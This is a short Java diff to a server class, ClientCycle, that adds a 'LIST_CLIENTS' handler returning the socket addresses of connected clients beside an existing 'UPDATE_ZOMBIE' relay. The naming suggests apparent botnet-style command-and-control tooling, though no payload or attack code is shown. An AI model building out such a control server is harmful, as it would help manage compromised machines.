@@ -108,6 +108,16 @@ public class ClientCycle {
 			} else if (pkgIn.getMessage().equals("UPDATE_ZOMBIE")) {
 				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
 						.writeObject(new DataPackage().setMessage("UPDATE_ZOMBIE"));
+			} else if (pkgIn.getMessage().equals("LIST_CLIENTS")) {
+				ArrayList<Computer> computers = new ArrayList<>();
+				for (SocketPackage pkg : server.getClients()) {
+					if (!(boolean) pkg.getExtraData()[0]) {
+						computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(), false));
+					}
+				}
+
+				event.getOutputStream().writeObject(
+						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_CLIENTS"));
 			}
 		}
 	}
